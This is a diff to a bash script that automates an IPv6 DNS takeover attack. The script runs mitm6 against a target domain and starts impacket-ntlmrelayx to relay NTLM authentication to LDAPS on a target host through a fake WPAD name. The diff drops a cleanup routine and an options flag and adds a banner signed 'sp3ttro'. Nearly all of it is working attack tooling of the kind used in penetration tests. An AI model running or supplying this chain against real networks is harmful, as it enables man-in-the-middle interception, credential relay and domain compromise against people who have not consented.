@@ -34,16 +34,29 @@ check_command() {
 
 # Print usage information
 usage() {
-  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v] [-o <impacket_options>] [-s]${RESET}"
+  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v] [-s]${RESET}"
   echo -e "${YELLOW}Options:${RESET}"
   echo -e "  -d  Specify the target domain"
   echo -e "  -t  Specify the target IP"
   echo -e "  -i  Specify the network interface (default: eth0)"
   echo -e "  -v  Enable verbose logging"
-  echo -e "  -o  Additional options for impacket-ntlmrelayx"
   echo -e "  -s  Enable silent mode (suppress console output)"
   exit 1
 }
+
+# Banner function
+banner() {
+  echo -e "${RED}"
+  echo -e "                                                                       "
+  echo -e " .__                             .__                                   "
+  echo -e " |  |__    ____  ___  ________   |  |__  _____  ___  __ ____    ____   "
+  echo -e " |  |  \ _/ __ \ \  \/  /\__  \  |  |  \ \__  \ \  \/ //  _ \ _/ ___\  "
+  echo -e " |   Y  \\  ___/  >    <  / __ \_|   Y  \ / __ \_\   /(  <_> )\  \___  "
+  echo -e " |___|  / \___  >/__/\_ \(____  /|___|  /(____  / \_/  \____/  \___  > "
+  echo -e "      \/      \/       \/     \/      \/      \/                   \/  "
+  echo -e "${YELLOW}                                by sp3ttro                             "
+  echo -e "${RESET}"
+}                                                      
 
 # Initialize variables with default values
 target_domain=""
@@ -51,18 +64,16 @@ target_ip=""
 interface="eth0"
 verbose=0
 silent=0
-impacket_options=""
-session_name="ipv6_dns_takeover_$(date '+%H%M%S')"
+session_name="ipv6_dns_takeover"
 dumps_dir="dumps"
 
 # Parse command-line arguments
-while getopts ":d:t:i:vo:s" opt; do
+while getopts ":d:t:i:vs" opt; do
   case "$opt" in
     d) target_domain="$OPTARG" ;;
     t) target_ip="$OPTARG" ;;
     i) interface="$OPTARG" ;;
     v) verbose=1 ;;
-    o) impacket_options="$OPTARG" ;;
     s) silent=1 ;;
     \?) usage ;;
   esac
@@ -109,14 +120,8 @@ if [ "$silent" -eq 1 ]; then
   exec > /dev/null 2>&1
 fi
 
-# Cleanup function
-clean_up() {
-  echo -e "${CYAN}Cleaning up temporary files and sessions...${RESET}"
-  rm -rf "$dumps_dir"
-  tmux kill-session -t "$session_name" 2>/dev/null
-  kill $(jobs -p) 2>/dev/null
-}
-trap clean_up EXIT INT
+# Display the banner
+banner
 
 # Check if the tmux session already exists
 echo -e "${CYAN}Checking if the tmux session '$session_name' already exists...${RESET}"
@@ -148,7 +153,7 @@ start_tmux_window "$session_name" "mitm6" "mitm6 -i $interface -d $target_domain
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $dumps_dir $impacket_options" || {
+start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $dumps_dir" || {
   echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
   exit 1
 }
@@ -169,12 +174,5 @@ if [ "$verbose" -eq 1 ]; then
   echo -e "${YELLOW}Disabling verbose mode...${RESET}"
   set +x
 fi
-
-# Display summary
-echo -e "${GREEN}Setup complete.${RESET}"
-echo -e "${CYAN}Session Name: ${RESET}${session_name}"
-echo -e "${CYAN}Target Domain: ${RESET}${target_domain}"
-echo -e "${CYAN}Target IP: ${RESET}${target_ip}"
-echo -e "${CYAN}Log File: ${RESET}${log_file}"
 
 exit 0
